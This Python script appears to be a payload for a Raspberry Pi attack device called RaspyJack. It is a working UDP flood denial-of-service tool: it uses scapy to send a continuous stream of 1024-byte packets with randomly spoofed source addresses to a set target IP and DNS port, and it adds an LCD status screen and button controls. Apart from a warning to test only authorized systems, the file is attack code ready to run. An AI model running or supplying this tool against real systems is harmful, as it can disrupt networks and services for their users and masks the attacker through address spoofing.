#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS Attack: UDP Flood**
=================================================
A classic Denial of Service (DoS) attack that sends a high volume of
UDP packets to a target IP and port. The source IP address of the
packets is spoofed.

This can saturate the target's network bandwidth and consume system
resources, potentially making it unresponsive.

**!!! WARNING !!!**
This is a DENIAL OF SERVICE attack. Use with extreme caution and only
on systems you own and have authorization to test.
"""

import os, sys, subprocess, signal, time, threading, random
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    sys.exit(1)

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.1"
TARGET_PORT = 53 # DNS is a common target

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)

# --- Globals & Shutdown ---
running = True
attack_thread = None
attack_stop_event = threading.Event()
packet_count = 0

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def draw_ui(status: str):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "UDP Flood", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 35), status, font=FONT_STATUS, fill=status_color)
    d.text((5, 60), "Packets Sent:", font=FONT, fill="white")
    d.text((15, 75), str(packet_count), font=FONT_TITLE, fill="yellow")
    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

# --- Attack Logic ---
def udp_flood_worker():
    global packet_count
    # Create a 1024 byte payload
    payload = b'\x00' * 1024
    
    while not attack_stop_event.is_set():
        spoofed_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        p = IP(src=spoofed_ip, dst=TARGET_IP) / UDP(sport=RandShort(), dport=TARGET_PORT) / Raw(load=payload)
        send(p, verbose=0)
        packet_count += 1
        time.sleep(0.01)

def start_attack():
    global attack_thread, packet_count
    if not (attack_thread and attack_thread.is_alive()):
        packet_count = 0
        attack_stop_event.clear()
        attack_thread = threading.Thread(target=udp_flood_worker, daemon=True)
        attack_thread.start()

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

# --- Main Loop ---
try:
    is_attacking = False
    while running:
        draw_ui("ACTIVE" if is_attacking else "STOPPED")
        
        start_wait = time.time()
        while time.time() - start_wait < 1.0:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            if GPIO.input(PINS["OK"]) == 0:
                is_attacking = not is_attacking
                if is_attacking:
                    start_attack()
                else:
                    stop_attack()
                time.sleep(0.3)
                break
            time.sleep(0.05)
        if not running: break
except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("UDP Flood payload finished.")
